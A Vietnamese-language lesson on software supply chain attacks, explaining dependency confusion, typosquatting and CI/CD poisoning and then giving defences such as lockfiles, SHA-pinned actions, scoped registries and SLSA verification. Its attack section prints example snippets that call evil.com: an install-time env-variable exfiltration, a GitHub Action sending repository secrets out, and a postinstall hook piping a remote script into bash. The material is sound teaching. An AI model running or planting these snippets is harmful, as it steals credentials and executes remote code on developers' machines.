# Supply Chain Attacks (CI/CD Pipeline)

> **CWE**: CWE-829 | **Phân loại**: Supply Chain

## Kiến thức Nền tảng
Hãy tưởng tượng bạn đang xây dựng một ngôi nhà. Thay vì tự mình đúc từng viên gạch, rèn từng chiếc đinh hay chế tạo xi măng từ đầu, bạn sẽ ra cửa hàng vật liệu xây dựng để mua các sản phẩm làm sẵn về lắp ghép. Ngôi nhà của bạn sẽ được hoàn thành rất nhanh chóng. Thế nhưng, nếu một kẻ xấu lẻn vào nhà máy sản xuất gạch và trộn thuốc nổ vào đất sét, hoặc đánh tráo những chiếc đinh thép thành đinh sắt rỗng, ngôi nhà của bạn dù được xây dựng đúng kỹ thuật đến đâu cũng sẽ đứng trước nguy cơ đổ sập. 

Trong phát triển phần mềm hiện đại cũng vậy. Một ứng dụng thông thường có tới **80-90% mã nguồn đến từ các thư viện mã nguồn mở bên thứ ba** (như npm cho Node.js, PyPI cho Python). Quy trình từ khi lập trình viên viết code, tải các thư viện này, chạy qua hệ thống tự động để kiểm tra, đóng gói, cho đến khi đưa sản phẩm lên mạng được gọi là **Chuỗi cung ứng phần mềm** (Software Supply Chain). Mỗi bước trong chuỗi này — từ lúc tải thư viện, chạy hệ thống xây dựng tự động (CI/CD pipeline như GitHub Actions), đến lúc đóng gói ứng dụng (Docker) — đều là những mắt xích vô cùng quan trọng. Nếu một mắt xích bị kẻ xấu can thiệp và chèn mã độc vào, toàn bộ ứng dụng của bạn sẽ bị nhiễm độc ngay từ trong trứng nước.

Một pipeline CI/CD điển hình hoạt động như sau:

```yaml
# .github/workflows/build.yml - Normal CI/CD pipeline
name: Build and Deploy
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4        # Pull source code
      - run: npm install                  # Install dependencies from registry
      - run: npm run build                # Build application
      - run: npm test                     # Run tests
      - run: docker build -t myapp .      # Create container image
      - run: docker push registry/myapp   # Push to artifact registry
```

Mỗi bước trên đều là một điểm mà attacker có thể can thiệp: từ việc chèn mã độc vào dependency, đến việc compromise GitHub Action, hay thay đổi base Docker image.

## Mô tả lỗ hổng
Lỗ hổng **Tấn công chuỗi cung ứng** (Supply Chain Attack) xảy ra khi kẻ tấn công không tìm cách hack trực tiếp vào hệ thống phòng thủ của bạn, mà đi đường vòng bằng cách **tấn công vào các thành phần bên ngoài** mà bạn hoàn toàn tin tưởng và sử dụng hàng ngày.

Đây là một trong những mối đe dọa nguy hiểm nhất hiện nay vì các nhà phát triển thường có tâm lý tin tưởng mù quáng vào các gói thư viện phổ biến hoặc các công cụ tự động. Kẻ tấn công có thể sử dụng nhiều chiêu trò tinh vi:
- **Dependency Confusion (Nhầm lẫn thư viện)**: Lợi dụng sơ hở trong cấu hình để lừa máy chủ tải một thư viện độc hại có trùng tên với thư viện nội bộ của công ty nhưng được đẩy phiên bản (version) lên mức siêu cao trên các kho lưu trữ công cộng.
- **Typosquatting (Đặt tên gần giống)**: Đăng ký các gói thư viện có tên viết sai chính tả gần giống các thư viện nổi tiếng (như `lodahs` thay vì `lodash`) để chờ đợi các lập trình viên gõ nhầm và tải về.
- **Compromised Maintainer (Chiếm đoạt tài khoản nhà phát triển)**: Hack tài khoản của người quản trị một thư viện phổ biến để âm thầm cài cắm mã độc vào bản cập nhật tiếp theo.
- **CI/CD Poisoning (Đầu độc hệ thống tự động)**: Chèn các đoạn script độc hại vào các cấu hình tự động xây dựng để đánh cắp các mật khẩu và khóa bảo mật (secrets) của doanh nghiệp.

## Cơ chế tấn công
### 1. Dependency Confusion Attack

```python
# setup.py - Malicious package uploaded to public PyPI
# Package name matches internal company package "mycompany-auth"
from setuptools import setup
import os

# Exfiltrate environment variables during install
os.system(f"curl https://evil.com/collect?data=$(env | base64)")

setup(
    name="mycompany-auth",       # Same name as internal package
    version="99.0.0",            # Higher version forces auto-upgrade
    packages=["mycompany_auth"],
)
```

### 2. Typosquatting Attack

```bash
# Attacker registers similar package names on npm
npm publish colo-rs        # Target: colors (180M downloads/week)
npm publish reqeusts       # Target: requests
npm publish electorn       # Target: electron
```

### 3. CI/CD Pipeline Poisoning

```yaml
# Malicious GitHub Action that steals secrets
name: "Fake Code Quality Check"
runs:
  using: "composite"
  steps:
    - run: |
        # Steal all repository secrets and tokens
        curl -X POST https://evil.com/exfil \
          -d "secrets=${{ toJSON(secrets) }}" \
          -d "github_token=${{ github.token }}"
      shell: bash
```

### 4. Malicious postinstall Script

```json
{
  "name": "totally-legit-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('curl https://evil.com/shell.sh | bash')\""
  }
}
```

## Biện pháp phòng thủ
- **Tóm tắt**: Phòng chống các cuộc tấn công chuỗi cung ứng bằng cách khóa và xác minh tính toàn vẹn của các thư viện phụ thuộc, ghim phiên bản cụ thể, sử dụng registry nội bộ, ký/ghim các action CI/CD và liên tục thực hiện audit.
- **Các bước chi tiết**:
  - **Khóa các thư viện phụ thuộc (Lock dependencies)**: luôn commit các file khóa như `package-lock.json`, `Pipfile.lock`, `go.sum` và xác minh mã băm toàn vẹn (integrity hashes).
  - **Ghim phiên bản cụ thể (Pin specific versions)**: không sử dụng các dải phiên bản động như `^` hoặc `~`, hãy ghim phiên bản chính xác.
  - **Sử dụng registry nội bộ (Scoped registries)**: cấu hình `.npmrc` để đảm bảo các gói nội bộ chỉ được tải từ registry riêng tư.
  - **Ghim các action CI/CD theo SHA**: sử dụng mã băm commit (commit SHA) thay vì tag phiên bản cho các GitHub Actions.
  - **Thường xuyên quét và kiểm tra (Regular audits)**: chạy các công cụ quét lỗ hổng như `npm audit`, `pip-audit`, `trivy` trong pipeline CI/CD.
  - **Khung SLSA (SLSA Framework)**: áp dụng Supply-chain Levels for Software Artifacts để xác minh nguồn gốc và quy trình xây dựng phần mềm.

## Code Example
```yaml
# ❌ VULNERABLE: Unpinned dependencies and actions
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main           # Mutable tag - can be hijacked
      - uses: some-random-org/action@v1       # Unverified third-party action
      - run: npm install                       # No integrity verification
      - run: pip install mycompany-auth        # No source registry specified
```

```yaml
# ✅ SECURE: Pinned, verified, and scoped
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read                           # Minimal permissions
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # Pinned by SHA
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
        with:
          node-version-file: '.nvmrc'
          registry-url: 'https://npm.mycompany.com'  # Private registry for scoped packages
      - run: npm ci --ignore-scripts           # Use lockfile, skip postinstall scripts
      - run: npm audit --audit-level=high      # Fail on high-severity vulnerabilities
      - run: |
          # Verify SLSA provenance of critical dependencies
          slsa-verifier verify-artifact myapp.tar.gz \
            --provenance-path myapp.intoto.jsonl \
            --source-uri github.com/myorg/myapp
```

```ini
# .npmrc - Scoped registry configuration
@mycompany:registry=https://npm.mycompany.com/
//npm.mycompany.com/:_authToken=${NPM_TOKEN}
engine-strict=true
ignore-scripts=true
```


## Xem thêm
- [Malvertising](../malvertising/) — Xem thêm bài học về Malvertising.

## Nguồn tham khảo
- OWASP: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
- SLSA Framework: https://slsa.dev/
- CWE-829: https://cwe.mitre.org/data/definitions/829.html
- Snyk – Dependency Confusion: https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/

## Giải thích thuật ngữ
- **Software Supply Chain (Chuỗi cung ứng phần mềm)**: Tất cả các thành phần, thư viện, công cụ và quy trình tham gia vào việc xây dựng, đóng gói và triển khai phần mềm.
- **Dependency (Thư viện phụ thuộc)**: Các gói mã nguồn hoặc thư viện do bên thứ ba phát triển mà ứng dụng của bạn cần tải về để hoạt động.
- **CI/CD Pipeline**: Quy trình tự động hóa việc tích hợp, kiểm tra, xây dựng và triển khai phần mềm (Continuous Integration / Continuous Deployment).
- **Dependency Confusion**: Cuộc tấn công lừa hệ thống tải gói mã độc từ kho lưu trữ công cộng thay vì gói nội bộ an toàn.
- **Typosquatting**: Kỹ thuật tấn công đăng ký tên miền hoặc tên gói thư viện gần giống với các tên phổ biến nhằm lừa người dùng gõ sai chính tả.
- **Artifact Registry**: Kho lưu trữ các sản phẩm phần mềm sau khi build (như file nén, container images) để chuẩn bị đem đi cài đặt.
- **Postinstall Script**: Đoạn mã tự động chạy ngay sau khi một gói thư viện được tải và cài đặt xong trên máy tính.
- **SLSA Framework (Supply-chain Levels for Software Artifacts)**: Bộ tiêu chuẩn bảo mật giúp bảo đảm tính toàn vẹn và xác minh nguồn gốc của các sản phẩm phần mềm trong suốt chuỗi cung ứng.
